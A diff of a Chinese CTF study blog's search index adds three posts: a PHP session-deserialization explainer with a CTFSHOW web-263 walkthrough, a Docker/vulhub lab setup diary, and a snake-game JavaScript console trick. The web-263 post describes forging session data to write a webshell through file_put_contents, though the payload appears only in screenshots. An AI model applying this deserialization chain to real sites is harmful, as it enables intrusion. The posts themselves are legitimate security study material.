+<p><img   src="/../img/$%7Bfiilename%7D/image-20240225185914591.png"  alt="image-20240225185914591"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240225185932722.png"  alt="image-20240225185932722"></p>
+<p>我们就实现了这个功能</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>前面提到用户的输入会以序列化的形式存储在session中，php给我们提供了三种处理引擎，由<code>session.serialize_handler</code>来设置</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226152937389.png"  alt="image-20240226152937389"></p>
+<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><p>存储格式:键名+竖线+经过<code>serialize()</code>函数序列化处理的值</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226152654358.png"  alt="image-20240226152654358"></p>
+<p>这里竖线前面的user是<code>$_SESSION[&#39;user&#39;]</code>里的user，竖线后面的user是类名</p>
+<h3 id="php-binary"><a href="#php-binary" class="headerlink" title="php_binary"></a>php_binary</h3><p>键名的长度对应的ASCII字符+键名+经过<code>serialize()</code>函数序列化处理的值</p>
+<p>对比上面的php其实也就多个ASCII字符,少个竖线</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226153657091.png"  alt="image-20240226153657091"></p>
+<p>为了更直观，我把键名写到33个字符，33对应的ASCII字符为!</p>
+<h3 id="php-serialize"><a href="#php-serialize" class="headerlink" title="php_serialize"></a>php_serialize</h3><p>经过<code>serialize()</code>函数序列化处理的__数组__</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226154036903.png"  alt="image-20240226154036903"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226154420821.png"  alt="image-20240226154420821"></p>
+<p>a表示的是SESSION数组中有几个元素，花括号里包括序列化后的数据，这里的键名也需要<code>s::;</code>的表达</p>
+<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>当两个文件所用的处理器不相同时，且SESSION数组内的值可控时，我们就可以构造恶意数据来进行操作</p>
+<h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p>我在注册这边使用的是php_binary处理器，登录那边用的是php处理器</p>
+<p>注册这边它的用户名，和密码都是可控的，如果我们正常输入，它会这样存入</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226161914641.png"  alt="image-20240226161914641"></p>
+<p>我们就可以在username的属性动一些手脚达到改属性的目的，这里把Ewoji改为了Emoji</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226164258514.png"  alt="image-20240226164258514"></p>
+<p>之后再打开登录文件</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226162151930.png"  alt="image-20240226162151930"></p>
+<p>修改成功</p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>这里是由|产生了歧义，php处理器把|后面的东西当作对象反序列化了</p>
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="CTFSHOW-web-263"><a href="#CTFSHOW-web-263" class="headerlink" title="CTFSHOW web-263"></a>CTFSHOW web-263</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240226164651595.png"  alt="image-20240226164651595"></p>
+<p>题面，看源码，抓包无果，直接开扫</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226164731869.png"  alt="image-20240226164731869"></p>
+<p><a class="link"   href="http://www.zip,下载,打开/" >www.zip,下载，打开<i class="fas fa-external-link-alt"></i></a></p>
+<p>发现漏洞点</p>
+<p>1.写入SESSION:原本用来记录limit的值可以修改</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185421699.png"  alt="image-20240226185421699"></p>
+<p>2.写入文件:<code>file_put_contents()</code>,这里的意思是用用户输入的username为一个log-xxx的日志文件命名，写入的内容password可以用反序列修改，这就可以直接写马</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185527715.png"  alt="image-20240226185527715"></p>
+<p>3.触发反序列化，这里的&#x2F;inc&#x2F;inc.php是不可访问的，但是check.php没有禁止访问而且它包含了inc.php，访问check.php即可触发反序列化</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185757295.png"  alt="image-20240226185757295"></p>
+<p>最后的payload如下 :</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185841358.png"  alt="image-20240226185841358"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185855523.png"  alt="image-20240226185855523"></p>
+<p>然后连接读取flag即可</p>
 ]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
       <tags>
-        <tag>-ctf</tag>
+        <tag>学习</tag>
+        <tag>入门</tag>
+        <tag>php反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>使用kali-linux和docker搭建漏洞复现平台日记</title>
+    <url>/2024/03/11/%E4%BD%BF%E7%94%A8kali-linux%E5%92%8Cdocker%E6%90%AD%E5%BB%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%B9%B3%E5%8F%B0%E6%97%A5%E8%AE%B0/</url>
+    <content><![CDATA[<h3 id="其实早就想弄这个了，老是忘了，这次队长布置了任务就做了吧"><a href="#其实早就想弄这个了，老是忘了，这次队长布置了任务就做了吧" class="headerlink" title="其实早就想弄这个了，老是忘了，这次队长布置了任务就做了吧"></a>其实早就想弄这个了，老是忘了，这次队长布置了任务就做了吧</h3><span id="more"></span>
+
+<h1 id="kali-linux优化"><a href="#kali-linux优化" class="headerlink" title="kali-linux优化"></a>kali-linux优化</h1><p>刚刚开始下的时候可卡了，输入老是有延迟，用的很不爽</p>
+<h2 id="掉帧问题"><a href="#掉帧问题" class="headerlink" title="掉帧问题"></a>掉帧问题</h2><p><a class="link"   href="https://zhuanlan.zhihu.com/p/265868395" >解决VMware运行卡顿的问题 - 知乎 (zhihu.com)<i class="fas fa-external-link-alt"></i></a></p>
+<p>亲测有效</p>
+<h2 id="num-lock问题"><a href="#num-lock问题" class="headerlink" title="num lock问题"></a>num lock问题</h2><p>鼠标在虚拟机和主机切换的时候老是跳</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240311225635342.png"  alt="image-20240311225635342"></p>
+<p>其实是因为主机和虚拟机的lock状态不同，摁数字上面的那个num跳成一致即可</p>
+<h1 id="下载docker和vulhub"><a href="#下载docker和vulhub" class="headerlink" title="下载docker和vulhub"></a>下载docker和vulhub</h1><p>sudo apt-get install docker.io</p>
+<p>sudo apt-get install python3-pip</p>
+<p>sudo apt-get install docker-compose</p>
+<p>git clone <a class="link"   href="https://github.com/vulhub/vulhub.git" >https://github.com/vulhub/vulhub.git<i class="fas fa-external-link-alt"></i></a></p>
+<p>这里出现了好多报错，耐心排查，收集资料</p>
+<h1 id="docker一些小知识"><a href="#docker一些小知识" class="headerlink" title="docker一些小知识"></a>docker一些小知识</h1><p>这里有几个概念，仓库，tar包，dockerfile，容器</p>
+<p>我们要记住这四个东西都是为一个东西——镜像服务的即可</p>
+<p>镜像是什么，镜像就是一个巨大的压缩文件，它可以把很多东西压缩在里面，比如一些系统环境啥的</p>
+<h2 id="仓库"><a href="#仓库" class="headerlink" title="仓库"></a>仓库</h2><p>用来存储镜像的地方</p>
+<p><code>docker pull</code>将镜像从仓库拉出来</p>
+<p><code>docker push</code>将镜像推进仓库</p>
+<h2 id="tar包"><a href="#tar包" class="headerlink" title="tar包"></a>tar包</h2><p>tar是镜像的压缩，通过指令可以解压和打包</p>
+<p><code>docker save</code>把镜像打成tar包</p>
+<p><code>docker load</code>把tar包解药为镜像</p>
+<h2 id="dockerfile"><a href="#dockerfile" class="headerlink" title="dockerfile"></a>dockerfile</h2><p>由于dockerfile的语法我不是很懂</p>
+<p>这里只知道dockerfile可以在编辑后通过<code>docker build</code>建成一个镜像文件</p>
+<h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><p>容器就是容纳镜像解压出来后的所有东西，它容下了所有的配置，代码啥的</p>
+<p>我们就可以直接访问这个容器得到所得的服务</p>
+<p><code>docker run -dit -p 100:80 --name ewoji</code>启动容器–参数-d表示在后台运行，-p表示端口映射如100:80（前是内网后是外网）–name 给你的容器取名 -t开个可互动的bash -i标准输出回本机</p>
+<p><code>docker commit</code>容器在改动后还可以再压缩回镜像</p>
+<p><code>docker exec -it yourname bash </code>进入容器的终端进行控制 exit退出 </p>
+<p><code>docker ps</code>查看已经开启的容器的信息</p>
+<h2 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h2><p>docker-compose就是掌管多个容器相互通信的东西</p>
+<p>多个容器通过一张docker网卡来实现ip地址的分配，容器之间可以直接curl+ip来获取另一容器的数据，本地则通过网卡路由来与容器交换信息（一般在创建容器的时候要分配好域名，不然又要到容器上看host文件）</p>
+<p><code>docker run -dit --link ewoji:ewoji --name eowji</code>把另一个容器ewoji映射到本容器，其实就是修改host文件</p>
+<p>之后就直接curl ewoji就好了</p>
+<p>既然这样那还用docker-compose干嘛呢，试想如果有三个容器，一个nginx，一个php，一个mysql，用户通过80端口使用NGINX服务，那么Nginx容器必然要用link链接php，而php又要链接mysql，而且创建容器的顺序还必须先从mysql开始，不然php就无法配置链接</p>
+<p>那么有没有一种可能，就是我们把配置文件统一掌管，可以实时修改呢，那就是docker-compose</p>
+<p>等于一个统一部署吧</p>
+<h3 id="docker-compose-yml"><a href="#docker-compose-yml" class="headerlink" title="docker-compose.yml"></a>docker-compose.yml</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240312181044240.png"  alt="image-20240312181044240"></p>
+<p>可见这里做了配置文件和根目录的映射</p>
+<p><code>docker-compose up -d</code>这样就开始拉取镜像了 </p>
+<h1 id="使用vulhub中的靶场"><a href="#使用vulhub中的靶场" class="headerlink" title="使用vulhub中的靶场"></a>使用vulhub中的靶场</h1><p>ls vulhub</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240312174132393.png"  alt="image-20240312174132393"></p>
+<p>这里有很多，选个认识的<code>cd vulhub/weblogic/CVE-2018-2894</code>,<code>docker run -d up</code>这里实际上就是集成了<code>docker run</code>和<code>docker-compose up -d</code></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240312181853731.png"  alt="image-20240312181853731"></p>
+<p>看到已经启动了，再访问本地ip和你映射的端口即可</p>
+<p><code>docker stop &lt;id or name&gt;</code>关闭容器</p>
+<p><code>docker rm &lt;id or name&gt;</code>删除容器，记得先关闭再删除</p>
+<h1 id="使用本地的镜像文件搭建靶场"><a href="#使用本地的镜像文件搭建靶场" class="headerlink" title="使用本地的镜像文件搭建靶场"></a>使用本地的镜像文件搭建靶场</h1><p>下载好的五题</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240312195458969.png"  alt="image-20240312195458969"></p>
+<p>进入哪个rd都可以，看见里面有Dockerfile文件，在这里打开终端</p>
+<p><code>docker build -t name .</code>特别注意后面的那个点代表当前目录</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240312195639419.png"  alt="image-20240312195639419"></p>
+<p>可以看见已经拉成镜像了</p>
+<p>接着这里应该是没有弄docker-compose.yml吧那就两个直接run就好了</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240312205525422.png"  alt="image-20240312205525422"></p>
+<h1 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h1><p>如果要用宿主机来访问容器来进行抓包等操作的话，我们需要借助kali的虚拟网卡，只需在宿主机powershell加入一下命令即可</p>
+<p>若不知道kali的虚拟网卡,ifconfig就可以查看</p>
+<p>route add -P docker网段 mask 255.255.255.0 虚拟机IP</p>
+]]></content>
+      <categories>
+        <category>复现</category>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>工具</tag>
+        <tag>复现</tag>
       </tags>
   </entry>
   <entry>
@@ -1083,6 +1135,35 @@
       <tags>
         <tag>学习</tag>
         <tag>ctfshow</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记录一题好玩的游戏题</title>
+    <url>/2024/05/09/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%A2%98%E5%A5%BD%E7%8E%A9%E7%9A%84%E6%B8%B8%E6%88%8F%E9%A2%98/</url>
+    <content><![CDATA[<h1 id="我给五星"><a href="#我给五星" class="headerlink" title="我给五星"></a>我给五星</h1><span id="more"></span>
+
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240509210350791.png"  alt="image-20240509210350791"></p>
+<p>需要我们控制小蛇生存60s，玩玩看</p>
+<p><img   src="/../img/$%7Bfiilename%7D/QQ%E5%BD%95%E5%B1%8F20240509205907%20(1).gif"  alt="QQ录屏20240509205907 (1)"></p>
+<p>玩个蛋，给他60s估计都能飞上月球了</p>
+<p>我们打开控制台看源码</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240509210928331.png"  alt="image-20240509210928331"></p>
+<h1 id="高效解法"><a href="#高效解法" class="headerlink" title="高效解法"></a>高效解法</h1><p>可以看到一切都是从new一个snake开始的，注意到timeCounter计时器，于是我们在控制台new一个新的snake再修改计时器时间即可</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240509211124591.png"  alt="image-20240509211124591"></p>
+<p>成功出现flag</p>
+<h1 id="搞笑解法"><a href="#搞笑解法" class="headerlink" title="搞笑解法"></a>搞笑解法</h1><h2 id="修改地图大小"><a href="#修改地图大小" class="headerlink" title="修改地图大小"></a>修改地图大小</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240509211716297.png"  alt="image-20240509211716297"></p>
+<p>看看效果</p>
+<p><img   src="/../img/$%7Bfiilename%7D/QQ%E5%BD%95%E5%B1%8F20240509211757.gif"  alt="QQ录屏20240509211757"></p>
+<p>可以看到撞墙了没有死，说明地图确实大了，然后咱们等他跑个60s就好</p>
+<h2 id="改变小蛇速度"><a href="#改变小蛇速度" class="headerlink" title="改变小蛇速度"></a>改变小蛇速度</h2><p><img   src="/../img/$%7Bfiilename%7D/QQ%E5%BD%95%E5%B1%8F20240509213044.gif"  alt="QQ录屏20240509213044"></p>
+<p>因为小蛇速度会加快，那么我们就设置一个定时任务，每0.5秒重新设置一次速度就好了</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ewoji = <span class="keyword">new</span> <span class="title class_">Snake</span>(<span class="string">&#x27;ewoji&#x27;</span>,<span class="number">1.5</span>,<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params"></span>) &#123;</span><br><span class="line">  ewoji.<span class="property">speed</span> = <span class="number">1.5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> intervalID = <span class="built_in">setInterval</span>(myFunction, <span class="number">500</span>);</span><br></pre></td></tr></table></figure>
+
+<p>或者干脆直接把speed设置为0，这样小蛇就会像bot一样在原地不动了</p>
+<p>嘻嘻</p>
+]]></content>
+      <tags>
+        <tag>-ctf</tag>
       </tags>
   </entry>
 </search>
